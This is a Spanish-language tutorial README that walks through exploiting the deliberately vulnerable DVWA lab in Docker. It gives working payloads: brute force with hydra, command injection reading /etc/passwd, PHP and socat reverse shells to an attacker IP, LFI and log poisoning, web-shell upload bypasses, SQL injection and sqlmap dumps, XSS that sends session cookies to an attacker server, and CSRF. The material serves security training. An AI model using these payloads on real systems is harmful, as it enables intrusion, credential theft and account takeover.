# DVWA

DVWA es una aplicación web PHP / MySQL vulnerable que sirve para practicar con algunas de las vulnerabilidades web más comunes, es un muy buen recurso para iniciarse en el hacking web.

Este artículo es una guía de iniciación en hacking web que pretende explicar algunas de las vulnerabilidades web más conocidas. Se verá la explotación de la mayoria de vulnerabilidades de esta aplicación, excepto las que exceden el objetivo del artículo.

# Indice

1. [Despliegue](https://github.com/sapellaniz/dvwa#despliegue)
2. [Brute force](https://github.com/sapellaniz/dvwa#brute-force)
3. [Command injection](https://github.com/sapellaniz/dvwa#command-injection)
4. [File inclusion](https://github.com/sapellaniz/dvwa#file-inclusion)
5. [Log poisoning](https://github.com/sapellaniz/dvwa#log-poisoning)
6. [File upload](https://github.com/sapellaniz/dvwa#file-upload)
7. [SQL injection](https://github.com/sapellaniz/dvwa#sql-injection)
8. [SQL injection (Blind)](https://github.com/sapellaniz/dvwa#sql-injection-blind)
9. [Weak Session IDs](https://github.com/sapellaniz/dvwa#weak-session-ids)
10. [XSS Reflected](https://github.com/sapellaniz/dvwa#xss-reflected)
11. [XSS Stored](https://github.com/sapellaniz/dvwa#xss-stored)
12. [CSRF](https://github.com/sapellaniz/dvwa#csrf)

# Despliegue

Gracias a docker, este laboratorio se puede desplegar en cuestion de segundos:

```
$ sudo docker run --name dvwa --rm -it -p 80:80 vulnerables/web-dvwa
```

Antes de comenzar con los ataques, es necesario crear la base de datos en [http://127.0.0.1/setup.php](http://127.0.0.1/setup.php)

![Setup](https://github.com/sapellaniz/dvwa/blob/master/img/setup.png)

Una vez creada la base de datos, se puede acceder a la apliacación con las credenciales por defecto (admin:password) en [http://127.0.0.1/login.php](http://127.0.0.1/login.php).

En la sección [DVWA Security](http://127.0.0.1/login.php) se puede configurar el nivel de dificultad del laboratorio.

![Security](https://github.com/sapellaniz/dvwa/blob/master/img/security.png)



# Brute Force

![Brute Force](https://github.com/sapellaniz/dvwa/blob/master/img/brute-00.png)

La primera vulnerabilidad es fuerza bruta, consiste en probar todas las posibles combinaciones de unas credenciales. En este caso realizaremos una variante del ataque que es fuerza bruta por diccionario, en vez de probar todas las posibles combinaciones, probaremos solamente con las contraseñas almacenadas en la lista [fasttrack.txt](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt)

### Security: low
En el nivel bajo de seguridad, no hay ninguna medida de protección frente a los ataques de fuerza bruta, la parte que afecta a cada vulnerabilidad puede verse pulsando en el botón "View Source".

Para explotar esta vulnerabilidad podemos usar la herramienta hydra. Para poder realizarlo necesitamos la IP del servidor, el usuario, el diccionario de contraseñas, la consulta HTTP, la cookie de identificación "PHPSESSID", y el mensaje que se muestra cuando el login es fallido:

```
hydra 127.0.0.1 -l admin -P fasttrack.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=rmc2daskbu2hcnskgm815hgbn2; security=low" -t 32
```

![Brute Force](https://github.com/sapellaniz/dvwa/blob/master/img/brute-01.png)

### Security: medium
En el nivel medio de seguridad, la única protección es un delay de 2 segundos, si se le puede llamar protección a esto. Se puede explotar con el mismo comando que usamos para explotar la vulnerabilidad en nivel bajo de seguridad.



# Command injection

![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-00.png)

Esta vulnerabilidad es la numero 1 en el OWASP Top Ten, esta organización la define así:

"La vulnerabilidad Command injection permite la ejecución de comandos arbitrarios en el sistema operativo host a través de una aplicación vulnerable. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema. En este ataque, los comandos del sistema operativo proporcionados por el atacante generalmente se ejecutan con los privilegios de la aplicación vulnerable. Los ataques de inyección de comandos son posibles en gran parte debido a una validación de entrada insuficiente.

Este ataque se diferencia de la inyección de código en que la inyección de código le permite al atacante agregar su propio código que luego es ejecutado por la aplicación. En Command Injection, el atacante extiende la funcionalidad predeterminada de la aplicación, que ejecuta comandos del sistema, sin la necesidad de inyectar código."

### Security: low
Con el nivel de seguridad bajo seleccionado, no hay ninguna protección, la entrada del formulario se pasará directamente a una shell, solamente hay que interrumpir el comando empezado por la aplicación e introducir el comando que deseemos.

```
;cat /etc/passwd #
```

![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-01.png)

### Security: medium
Con el nivel de seguridad medio seleccionado, la única protección es que los badchars "&&" y ";" serán eliminados de nuestra entrada, pero podemos interrumpir el comando con muchos otros:

```
&cat /etc/passwd #
```

![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-02.png)

Como atacantes, lo que más nos interesa en este punto es obtener una shell interactiva, para tener una mayor libertad y poder causar un mayor impacto:

```
# En el atacante:
sudo rlwrap nc -nvlp 443
# En DVWA
php -r '$sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Security: high
Con el nivel de seguridad alto seleccionado, la lista de badchars ha aumentado a "&", ";", "| ", "-", "$", "(", ")", "'" y "||". Si nos fijamos, se puede ver que el badchar "| " contiene un espacio después de la tubería, asi que si introducimos una tubería sin un espacio inmediatamente después, no será eliminada:

```
|cat /etc/passwd
```

![Command injection](https://github.com/sapellaniz/dvwa/blob/master/img/command-injection-03.png)



# File Inclusion

![File inclusion](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-00.png)

La vulnerabilidad de inclusión de archivos permite a un atacante incluir un archivo en la respuesta del servidor. La vulnerabilidad se produce debido al uso de entradas proporcionadas por el usuario sin la validación adecuada. Hay dos variantes: Local File Inclusion (LFI), cuando el archivo incluido pertenece al servidor y Remote File Inclusion (RFI), cuando el archivo pertenece a un servidor remoto, ajeno al servidor vulnerable. En este caso solamente realizaremos varios LFI porque este laboratorio no ha sido configurado para permitir RFI.

### Security: low
Cuando se pasan parámetros a una aplicación web, sobre todo mediante el método GET, lo primero que se nos viene a la mente son inyecciones (de código o de comamdos) y LFI/RFI, en este caso ya sabemos de qué se trata.

Con el nivel de seguridad bajo seleccionado, no hay ninguna protección, se puede explotar haciendo directory traversal:

```
# Desde el navegador:
?page=../../../../../etc/passwd

# Desde la consola:
file="/etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=../../../../..$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=low" | sed '/DOCTYPE/q' | sed '$ d'
```

![File inclusion](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-01.png)

### Security: medium
Con el nivel de seguridad medio seleccionado, hay algunos badchars para RFI y los de LFI son "../" y "..\", pero esto no es una solución eficaz:

```
# Desde el navegador:
?page=/etc/passwd

# Desde la consola:
file="/etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=medium" | sed '/DOCTYPE/q' | sed '$ d'
```

![File inclusion](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-02.png)

### Security: high
Con el nivel de seguridad alto seleccionado, la entrada debe comenzar por la cadena "file", sin problema:
```
?page=file:///etc/passwd
file="file:///etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=high" | sed '/DOCTYPE/q' | sed '$ d'
```

![File inclusion](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-03.png)



# Log Poisoning

En algunos escenarios, a través de un LFI podemos lograr RCE gracias a la técnica conocida como Log Poisoning. Para poder realizar este ataque, mediante el LFI debemos ser capaces de incluir un archivo de logs que podamos modificar de forma arbitraria, así podremos hacer que la aplicación registre un log con código PHP que, al ser incluido mediante LFI, la aplicacion lo ejecute.


Lo primero es encontrar este archivo:

```
# 1- Comprobar el sistema operativo
$ file="file:///etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=high" | sed '/DOCTYPE/q' | sed '$ d'
# 2- Buscar en internet el directorio de logs de apache2 en Debian
$ file="file:///etc/apache2/apache2.conf";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=high" | sed '/DOCTYPE/q' | sed '$ d' | grep APACHE_LOG_DIR
# 3- Encontrar la variable "APACHE_LOG_DIR"
$ file="file:///etc/apache2/envvars";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=high" | sed '/DOCTYPE/q' | sed '$ d'
```

Una vez encontrado el archivo (/var/log/apache2/access.log), hay que realizar un pequeño cambio en el laboratorio para poder realizar el ataque, este archivo de logs solamente tiene permisos de lectura para el grupo adm, por lo que tendremos que añadir al usuario www-data a este grupo:

```
# 1- Añadir el usuario www-data al grupo adm
$ sudo docker exec dvwa usermod -a -G adm www-data
# 2- Reiniciar el servidor web
$ sudo docker exec dvwa service apache2 restart
```

Ahora ya podemos realizar el ataque:

```
# 1- Envenenar los logs
$ echo "<?PHP echo system(\$_GET['y'])?>" | nc 127.0.0.1 80
# 2- Ejecución de código
## Reverse shell:
$ rlwrap nc -nvlp 1111
$ file="/var/log/apache2/access.log&y=socat TCP4:172.17.0.1:1111 EXEC:/bin/bash";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=medium"

## Bind shell:
$ file="/var/log/apache2/access.log&y=socat -d -d TCP4-LISTEN:2222 EXEC:/bin/bash";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=medium"
$ rlwrap nc 172.17.0.2 2222
```



# File Upload

![File upload](https://github.com/sapellaniz/dvwa/blob/master/img/file-upload-00.png)

Si una aplicación web permite a los usuarios subir archivos al servidor sin ningún tipo de restricción, esto se considera una vulnerabilidad ya que puede desencadenar en ejecución remota de código entre otras vulnerabilidades.

### Security: low
Con el nivel de seguridad bajo seleccionado, no hay ninguna protección, se puede subir cualquier archivo, en este caso usaré [esta reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):

```
# 1- Poner a la escucha un puerto:
$ sudo rlwrap nc -nvlp 443
# 2- Subir el archivo
# 3- Hacer que el servidor ejecute el archivo:
$ curl -s http://127.0.0.1/hackable/uploads/reverse.php
```

![File upload](https://github.com/sapellaniz/dvwa/blob/master/img/file-upload-01.png)

### Security: medium
Con el nivel de seguridad medio seleccionado, nos encontramos con dos comprobaciones: que el archivo sea .png o .jpeg y que tenga un tamaño menor que 100000 bytes. Si subimos el archivo de antes, al terminar en .php, nos cancela la subida, sin embargo, podemos subirlo con extensión .php.png, interceptar la petición con el navegador y cambiar la extensión a .php. En este caso tuve problemas con las reverse shells así que utilicé la web shell [p0wny](https://github.com/flozz/p0wny-shell):


![File upload](https://github.com/sapellaniz/dvwa/blob/master/img/file-upload-02.png)

![File upload](https://github.com/sapellaniz/dvwa/blob/master/img/file-upload-03.png)

### Security: high
Con el nivel de seguridad alto seleccionado, hay una comprobación adicional, mediante la función getimagesize() comprueba el alto y ancho de la imagen. Para bypassear la protección hay que añadir la cadena "GIF89a" al inicio de la reverse shell, lo que provoca que ésta función falle y le de un alto y un ancho, aunque realmente no lo tenga. Aun así no podremos editar el nombre del archivo en el cuerpo de la petición, así que tendremos que modificar el nombre del archivo subido mediante la vulnerabilidad command injection.

![File upload](https://github.com/sapellaniz/dvwa/blob/master/img/file-upload-04.png)



# SQL injection

Esta vulnerabilidad también pertenece a la categoría de inyecciones, la primera del OWASP Top Ten, en vez de código, permite inyectar código SQL en una consulta, debido a una validación de entrada insuficiente.

![SQLi](https://github.com/sapellaniz/dvwa/blob/master/img/sqli-00.png)

### Security: low
Con el nivel de seguridad bajo seleccionado, no hay ninguna protección. Con estos payloads podemos obtener las tablas y columnas de la base de datos:

```
' AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns#
'or 1=0 union select user,password from users#
```

![SQLi](https://github.com/sapellaniz/dvwa/blob/master/img/sqli-01.png)

### Security: medium
Con el nivel de seguridad bajo seleccionado, nos encontramos con la función mysqli_real_escape_string(), podemos usar los mismos payloads que en el nivel de seguridad bajo, pero sin los caracteres especiales. A demás, en vez de pasar el payload por un formulario, debemos interceptar la petición y editar su cuerpo:

```
AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
or 1=0 union select user,password from users
```

![SQLi](https://github.com/sapellaniz/dvwa/blob/master/img/sqli-02.png)

### Security: high
Con el nivel de seguridad alto seleccionado, vemos que después de nuestra entrada, se añade la cadena "LIMIT 1" a la consulta. Esto hace que cada consulta solamente pueda mostrar un resultado. Esto se puede bypassear facilmente si al final de nuestra entrada añadimos el cracter '#':

```
AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns#
or 1=0 union select user,password from users#
```

![SQLi](https://github.com/sapellaniz/dvwa/blob/master/img/sqli-03.png)



# SQL injection (Blind)

Esta variante de SQLi se caracteriza porque la consulta no devuelve información en la respuesta del servidor, pero el resultado de la consulta puede deducirse mediante diferentes técnicas como por ejemplo añadir delays a las consultas cuando son correctas (Si la primera letra del nombre de la primera base de datos es una "A", espere 10 segundos).

Para explotar esta vulnerabilidad usaré la herramienta sqlmap, igual de válida en todas las dificultades:

```
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -cookie="security=low; PHPSESSID=ei2b9c1t64fj59703e70k51kd2" -dbs                          // listar bases de datos
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -cookie="security=low; PHPSESSID=ei2b9c1t64fj59703e70k51kd2" -D dvwa -tables               // listar tablas
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -cookie="security=low; PHPSESSID=ei2b9c1t64fj59703e70k51kd2" -D dvwa -T users --column     // columnas de la tabla users
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -cookie="security=low; PHPSESSID=ei2b9c1t64fj59703e70k51kd2" -D dvwa -T users --dump       // dumpear tabla entera
cat '/home/grail/.local/share/sqlmap/output/127.0.0.1/dump/dvwa/users.csv' | column -t -s "," -o "|"
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -cookie="security=low; PHPSESSID=ei2b9c1t64fj59703e70k51kd2" -D dvwa -T users -C user_id,user,password --dump
    // solo algunos campos
```

Esta herramienta es tan potente que permite incluso detectar y crackear los hashes dumpeados de las contraseñas almacenadas en la bsae de datos:

![SQLi blind](https://github.com/sapellaniz/dvwa/blob/master/img/sqli-04.png)



# Weak Session IDs

![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-00.png)

Las aplicaciones web modernas establecen una serie de transacciones entre el cliente y el servidor. Dado que el protocolo HTTP no tiene estado, la forma de seguir a un usuario es crear sesiones por usuario autenticado mediante identificadores. Si estos identificadores se pueden predecir, esto puede llevar a un secuestro de sesión.

### Security: low
Con el nivel de seguridad bajo seleccionado, si se pulsa unas pocas veces el botón "Generate" mientras se inspeccionan las cookies en el navegador, se puede deducir que el ID se va incrementando de uno en uno para cada sesión, sin tener que mirar el código.

![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-01.png)

### Security: medium
Con el nivel de seguridad medio seleccionado, también es fácil deducir que el ID es el timestamp en decimal del momento en el que se crea la sesión. Podemos identificarlo facilmente con la herramienta [Cyber chef](https://gchq.github.io/CyberChef/):

![Weak session ids](https://github.com/sapellaniz/dvwa/blob/master/img/weak-session-id-02.png)

### Security: high
Con el nivel de seguridad alto seleccionado, es igual que en el nivel bajo, solo que en vez de en plano, el ID es el hash MD5, en internet hay bases de datos con gran cantidad de hashes crackeados, asi que introduciendo el hash en un buscador aparecen gran cantidad de resultados con la cadena original.


# XSS Reflected

![XSS Reflected](https://github.com/sapellaniz/dvwa/blob/master/img/xss-reflected-00.png)

Los ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en el que se inyectan scripts maliciosos en sitios web.

Los ataques reflejados son aquellos en los que el script inyectado se refleja en el servidor web, como en un mensaje de error, resultado de búsqueda o cualquier otra respuesta que incluya parte o toda la entrada enviada al servidor como parte de la solicitud. Los ataques reflejados se envían a las víctimas a través de otra ruta, como en un mensaje de correo electrónico o en algún otro sitio web. Cuando se engaña a un usuario para que haga clic en un enlace malicioso, envíe un formulario especialmente diseñado o simplemente navegue a un sitio malicioso, el código inyectado viaja al sitio web vulnerable, que refleja el ataque en el navegador del usuario. Luego, el navegador ejecuta el código porque proviene de un servidor "confiable".

### Security: low
Con el nivel de seguridad bajo seleccionado, no hay ningún tipo de protección, podemos robar la cookie de sesión con el siguiente payload mientras dejamos un servidor http a la escucha en nuesta máquina:

```
# 1- Levantar servicdor http:
$ python3 -m http.server
# 2- Introducir el siquiente payload:
<script type="text/javascript">document.location='http://172.17.0.1:8000/index.html?c='+document.cookie;</script>
```

![XSS Reflected](https://github.com/sapellaniz/dvwa/blob/master/img/xss-reflected-01.png)

### Security: medium
Con el nivel de seguridad medio seleccionado, si inspeccionamos el código, podemos ver que hay una protección que elimina la cadena "script" de nuestra entrada, se puede bypassear facilmente con el siguiente payload:

```
<img src="#" onclick=document.location='http://172.17.0.1:8000/index.html?c='+document.cookie; >
```

### Security: high
Con el nivel de seguridad alto seleccionado, podemos usar el mismo payload que usamos con el nivel de seguridad medio.


# XSS stored

![XSS Stored](https://github.com/sapellaniz/dvwa/blob/master/img/xss-stored-00.png)

También conocido como XSS persistente, es el más dañino de los dos. Ocurre cuando un script malicioso se inyecta directamente en una aplicación web vulnerable. A diferencia del XSS Reflected, cada vez que la página infectada es visitada, el script se ejecuta en el navegador de la víctima, en vez de tener que engañar al usuario para que acceda a un enlace malicioso.

### Security: low
Con el nivel de seguridad bajo seleccionado, tenemos un problema, como máximo podemos introducir 10 caracteres en el campo "Name" y 50 en el campo "Message", para poder enviar una cadena de cualquier longitud en ambos campos, podemos interceptar la petición con el navegador para editarla y reenviarla.

Podemos comprobar cual es el campo del formulario vulnerable con el siguiente payload:

```
<script>alert("XSS")</script>
```

![XSS Stored](https://github.com/sapellaniz/dvwa/blob/master/img/xss-stored-00.png)

Ambos campos son vulnerables, ahora podemos introducir un payload malicioso que nos envíe la cookie de cualquier usuario que visite la página:

```
<script>document.location='http://172.17.0.1:8000/index.html?c='+document.cookie;</script>
```

Si desde un navegador sin cookies, nos logueamos con las credenciales de cualquier usuario que dumpeamos de la base de datos con sqlmap, al acceder a la página comprometida se ejecutará el script en este navegador.

El procedimiento es el mismo en los siguientes niveles de dificultad, y para cada nivel son válidos los mismos payloads que en el apartado de XSS Reflected.

Para terminar con los XSS quiero compartir un recurso bastante interesante sobre evasión de protecciones a la hora de explotar un XSS:

https://owasp.org/www-community/xss-filter-evasion-cheatsheet


# CSRF

![CSRF](https://github.com/sapellaniz/dvwa/blob/master/img/csrf-00.png)

La falsificación de solicitudes entre sitios (CSRF) es un ataque que obliga a un usuario final a ejecutar acciones no deseadas en una aplicación web en la que está autenticado actualmente. Para explotar esta vulnerabilidad, en este escenario, tendremos que combinarla con un XSS stored.

Vemos que podemos cambiar la contraseña del usuario actual mediante el formulario y que los parámetros viajan por la URL. Podríamos hacer que la "víctima" acceda a un link que cambie su contraseña a una que nosotros como atacantes conozcamos, el enlace sería el siguiente:

```
http://127.0.0.1/vulnerabilities/csrf/?password_new=PWN&password_conf=PWN&Change=Change#
```

Si hacemos que la victima acceda al link anterior, teniendo la sesión iniciada en la aplicación web, haremos que cambie su contraseña a "PWN", pero el link es demasiado evidente, para camuflarlo tenemos dos opciones:

1- Desplegar un servidor web con una página maliciosa
csrf.html

2- Redirigir a la víctima mediante un XSS stored
<script>document.location='http://127.0.0.1/vulnerabilities/csrf/?password_new=PWN&password_conf=PWN&Change=Change#';</script>%
url encode



